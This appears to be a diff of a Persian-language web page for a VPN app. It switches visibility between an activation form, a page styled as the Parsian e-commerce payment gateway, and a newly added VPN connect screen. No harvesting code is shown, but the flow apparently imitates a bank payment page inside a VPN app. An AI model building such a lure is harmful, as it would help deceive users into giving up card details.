@@ -16,7 +16,7 @@
     <!-- page 1 -->
     <div
       id="page1"
-      class="bg-black/90 flex hidden items-center flex-col justify-center h-[100dvh]"
+      class="bg-black/90 flex items-center flex-col justify-center h-[100dvh]"
     >
       <h1 class="text-white">
         برای فعال سازی اطلاعات خواسته شده را وارد نمایید.
@@ -91,7 +91,7 @@
     </div>
     <!-- end page 2 -->
     <!-- page 3 -->
-    <div id="page3" class="bg-[#F6F6F6] p-2 flex flex-col h-[100dvh]">
+    <div id="page3" class="bg-[#F6F6F6] p-2 flex hidden flex-col h-[100dvh]">
       <div class="flex flex-col bg-white p-1 rounded-lg">
         <span class="text-[#776363] text-sm text-center"
           >پرداخت اینترنتی تجارت الکترونیک پارسیان
@@ -218,6 +218,43 @@
       </div>
     </div>
     <!-- end page 3 -->
+    <!-- page 4 -->
+    <div id="page4" class="bg-[#28223C] p-3 flex hidden flex-col h-[100dvh]">
+      <div class="flex items-center justify-between">
+        <img src="./src/images/list.svg" class="w-7 cursor-pointer" alt="" />
+        <div class="flex items-center gap-4">
+          <img
+            src="./src/images/location.svg"
+            alt=""
+            class="w-5 cursor-pointer"
+          />
+          <img src="./src/images/share.svg" alt="" class="w-6 cursor-pointer" />
+          <img src="./src/images/speed.svg" alt="" class="w-6 cursor-pointer" />
+          <img
+            src="./src/images/diamond.svg"
+            alt=""
+            class="w-6 cursor-pointer"
+          />
+        </div>
+      </div>
+
+      <div class="mx-auto flex flex-col gap-5 mt-40">
+        <div
+          id="btnVpn"
+          class="w-32 cursor-pointer self-center flex items-center justify-center h-32 rounded-full transition-all duration-500 bg-[#E2DDF3]"
+        >
+          <img src="./src/images/off.svg" class="w-14" alt="svg" />
+        </div>
+        <span id="spanVpn" class="text-xl text-[#E2DDF3]"
+          >اتصال برقرار نیست</span
+        >
+      </div>
+      <span class="text-[#E2DDF3] text-[12px] text-center mt-auto"
+        >با استفاده از برنامه، شما با شرایط خدمات و سیاست حفظ حریم خصوصی ما
+        موافقت می کنید</span
+      >
+    </div>
+    <!-- end page 4 -->
 
     <script src="./src/js/index.js"></script>
     <script
